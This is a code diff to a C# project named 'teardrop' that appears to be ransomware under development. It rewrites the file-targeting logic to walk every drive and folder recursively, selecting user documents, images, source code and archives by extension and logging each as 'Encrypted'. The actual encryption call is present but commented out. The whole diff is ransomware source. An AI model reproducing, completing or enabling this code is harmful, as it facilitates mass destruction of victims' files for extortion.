@@ -50,9 +50,46 @@ namespace teardrop
             textBox1.AppendText(text + Environment.NewLine);
         }
 
-        public static List<string> drives = new List<string>();
-        public static List<string> files = new List<string>();
+        string[] file;
+        private void ShowAllFoldersUnder(string path, int indent)
+        {
+            try
+            {
+                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint)
+                    != FileAttributes.ReparsePoint)
+                {
+                    foreach (string folder in Directory.GetDirectories(path))
+                    {
+                        try
+                        {
+                            file = Directory.GetFiles(Path.GetFullPath(folder));
+                        } catch { }
 
+                        foreach(string s in file)
+                        {
+                            string ext = Path.GetExtension(s);
+                            var validExtensions = new[]
+                            {
+                                ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip", ".7zip",
+                                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma",
+                                ".wav", ".mpa", ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
+                                ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
+                            };
+
+                            if (validExtensions.Contains(ext))
+                            {
+                                //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
+                                write("Encrypted " + s);
+                            }
+
+                        }
+
+                        ShowAllFoldersUnder(folder, indent + 2);
+                    }
+                }
+            }
+            catch (UnauthorizedAccessException e) { write(e.Message); }
+        }
 
         public void GetFiles()
         {
@@ -65,10 +102,12 @@ namespace teardrop
                     try
                     {
                         write("Found drive " + drive.Name);
-                        write("Getting Files of Drive " + drive.Name);
 
-                        files.AddRange(Directory.EnumerateFiles(drive.Name, "*", 
-                            SearchOption.AllDirectories));
+                        try
+                        {
+                            ShowAllFoldersUnder(drive.Name, 0);
+                        }
+                        catch { }
                     }
                     catch (Exception ex1)
                     {
@@ -79,35 +118,6 @@ namespace teardrop
             catch(Exception ex)
             {
 
-            }
-
-
-            try
-            {
-                write("Getting Files");
-
-                foreach (string s in files)
-                {
-                    string ext = Path.GetExtension(s);
-                    var validExtensions = new[]
-                    {
-                        ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".exe", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", ".java", ".h", ".dll",".rar", ".zip", ".7zip",
-                        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma",
-                        ".wav", ".mpa", ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
-                        ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
-                    };
-
-                    if (validExtensions.Contains(ext)){
-                        //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
-                        write("Encrypted " + s);
-                    }
-                }
-
-                write("Done getting files");
-            }
-            catch (Exception ex2)
-            {
-                write(ex2.Message);
             }
         
         }
